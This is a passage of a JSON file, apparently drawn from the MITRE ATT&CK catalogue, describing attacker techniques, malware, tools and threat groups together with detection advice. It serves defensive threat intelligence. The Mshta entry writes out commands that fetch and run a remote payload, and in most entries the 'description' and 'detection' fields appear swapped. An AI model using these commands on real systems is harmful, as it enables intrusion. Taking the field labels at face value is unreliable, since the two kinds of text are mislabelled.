                "detection": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: China Chopper Web shell client).",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0073",
            "type": "tool",
            "attributes": {
                "name": "ASPXSpy",
                "aliases": [
                    "ASPXTool"
                ],
                "labels": [
                    "malware"
                ],
                "description": "ASPXSpy is a Web shell. It has been modified by Threat Group-3390 actors to create the ASPXTool version.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1505.003": "Web Shell"
                }
            },
            "val": 1
        },
        {
            "id": "T1570",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Lateral Tool Transfer",
                "chain_phase": "lateral-movement",
                "description": "Monitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.",
                "detection": "Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0029",
            "type": "tool",
            "attributes": {
                "name": "PsExec",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "PsExec is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1570": "Lateral Tool Transfer",
                    "T1569.002": "Service Execution",
                    "T1021.002": "SMB/Windows Admin Shares"
                }
            },
            "val": 3
        },
        {
            "id": "T1110.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Guessing",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.",
                "detection": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0020",
            "type": "tool",
            "attributes": {
                "name": "China Chopper",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "China Chopper is a Web Shell hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server.  It has been used by several threat groups.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1110.001": "Password Guessing",
                    "T1027.002": "Software Packing",
                    "T1070.006": "Timestomp",
                    "T1505.003": "Web Shell",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1046": "Network Service Scanning",
                    "T1005": "Data from Local System"
                }
            },
            "val": 10
        },
        {
            "id": "G0124",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Windigo",
                "aliases": [],
                "description": "The Windigo group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the Ebury SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, Windigo operators continued updating Ebury through 2019.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0377": "Ebury"
                },
                "techniques": {
                    "T1518": "Software Discovery",
                    "T1189": "Drive-by Compromise",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "T1556.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Pluggable Authentication Modules",
                "chain_phase": "credential-access",
                "description": "Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
                "detection": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1562.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Indicator Blocking",
                "chain_phase": "defense-evasion",
                "description": "Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}</code>",
                "detection": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting  or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry.  These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1574.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Dynamic Linker Hijacking",
                "chain_phase": "persistence",
                "description": "Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and <code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file. Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.  \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1556",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Modify Authentication Process",
                "chain_phase": "credential-access",
                "description": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation: Xorrior Authorization Plugins)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
                "detection": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Network"
                ]
            }
        },
        {
            "id": "T1554",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Compromise Client Software Binary",
                "chain_phase": "persistence",
                "description": "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \n\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.",
                "detection": "Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\n\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1552.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Private Keys",
                "chain_phase": "credential-access",
                "description": "Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.",
                "detection": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1020",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Automated Exfiltration",
                "chain_phase": "exfiltration",
                "description": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.",
                "detection": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "S0377",
            "type": "tool",
            "attributes": {
                "name": "Ebury",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Ebury is an SSH backdoor targeting Linux operating systems. Attackers require root-level access, which allows them to replace SSH binaries (ssh, sshd, ssh-add, etc) or modify a shared library used by OpenSSH (libkeyutils).",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1556.003": "Pluggable Authentication Modules",
                    "T1562.006": "Indicator Blocking",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1132.001": "Standard Encoding",
                    "T1574.006": "Dynamic Linker Hijacking",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1059.006": "Python",
                    "T1562.001": "Disable or Modify Tools",
                    "T1556": "Modify Authentication Process",
                    "T1554": "Compromise Client Software Binary",
                    "T1553.002": "Code Signing",
                    "T1552.004": "Private Keys",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1083": "File and Directory Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1014": "Rootkit",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 20
        },
        {
            "id": "G0123",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Volatile Cedar",
                "aliases": [
                    "Lebanese Cedar"
                ],
                "description": "Volatile Cedar is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. Volatile Cedar has been operating since 2012 and is motivated by political and ideological interests.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0572": "Caterpillar WebShell",
                    "S0569": "Explosive"
                },
                "techniques": {
                    "T1595.002": "Vulnerability Scanning",
                    "T1505.003": "Web Shell",
                    "T1190": "Exploit Public-Facing Application",
                    "T1105": "Ingress Tool Transfer"
                }
            }
        },
        {
            "id": "T1069.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Groups",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1110",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Brute Force",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.",
                "detection": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0572",
            "type": "tool",
            "attributes": {
                "name": "Caterpillar WebShell",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Caterpillar WebShell is a self-developed Web Shell tool created by the group Volatile Cedar.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1059.003": "Windows Command Shell",
                    "T1112": "Modify Registry",
                    "T1110": "Brute Force",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1014": "Rootkit",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "T1564.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Hidden Files and Directories",
                "chain_phase": "defense-evasion",
                "description": "Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.",
                "detection": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1115",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Clipboard Data",
                "chain_phase": "collection",
                "description": "Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.",
                "detection": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nIn Windows, Applications can access clipboard data by using the Windows API. OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1025",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Removable Media",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. \n\nSome adversaries may also use Automated Collection on removable media.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0569",
            "type": "tool",
            "attributes": {
                "name": "Explosive",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Explosive is a custom-made remote access tool used by the group Volatile Cedar. It was first identified in the wild in 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1564.001": "Hidden Files and Directories",
                    "T1056.001": "Keylogging",
                    "T1115": "Clipboard Data",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1025": "Data from Removable Media",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 12
        },
        {
            "id": "G0122",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Silent Librarian",
                "aliases": [
                    "TA407",
                    "COBALT DICKENS"
                ],
                "description": "Silent Librarian is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of  Silent Librarian are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC).",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1608.005": "Link Target",
                    "T1598.003": "Spearphishing Link",
                    "T1594": "Search Victim-Owned Websites",
                    "T1589.003": "Employee Names",
                    "T1589.002": "Email Addresses",
                    "T1588.004": "Digital Certificates",
                    "T1588.002": "Tool",
                    "T1585.002": "Email Accounts",
                    "T1583.001": "Domains",
                    "T1114.003": "Email Forwarding Rule",
                    "T1110.003": "Password Spraying",
                    "T1114": "Email Collection",
                    "T1078": "Valid Accounts"
                }
            }
        },
        {
            "id": "G0121",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Sidewinder",
                "aliases": [
                    "T-APT-04",
                    "Rattlesnake"
                ],
                "description": "Sidewinder is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0250": "Koadic"
                },
                "techniques": {
                    "T1598.003": "Spearphishing Link",
                    "T1598.002": "Spearphishing Attachment",
                    "T1059.007": "JavaScript",
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1518": "Software Discovery",
                    "T1203": "Exploitation for Client Execution",
                    "T1124": "System Time Discovery",
                    "T1119": "Automated Collection",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "T1003.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "NTDS",
                "chain_phase": "credential-access",
                "description": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.",
                "detection": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.\n\nIn addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Mshta",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
                "detection": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https://webserver/payload.sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0250",
            "type": "tool",
            "attributes": {
                "name": "Koadic",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Koadic is a Windows post-exploitation framework and penetration testing tool. Koadic is publicly available on GitHub and the tool is executed via the command-line. Koadic has several options for staging payloads and creating implants. Koadic performs most of its operations using Windows Script Host.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1569.002": "Service Execution",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1003.003": "NTDS",
                    "T1003.002": "Security Account Manager",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1548.002": "Bypass User Account Control",
                    "T1218.010": "Regsvr32",
                    "T1218.005": "Mshta",
                    "T1218.011": "Rundll32",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1135": "Network Share Discovery",
                    "T1115": "Clipboard Data",
                    "T1105": "Ingress Tool Transfer",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 20
        },
        {
            "id": "G0120",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "Evilnum",
                "aliases": [],
                "description": "Evilnum is a financially motivated threat group that has been active since at least 2018.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0568": "EVILNUM",
                    "S0349": "LaZagne",
                    "S0284": "More_eggs"
                },
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1204.001": "Malicious Link",
                    "T1497.001": "System Checks",
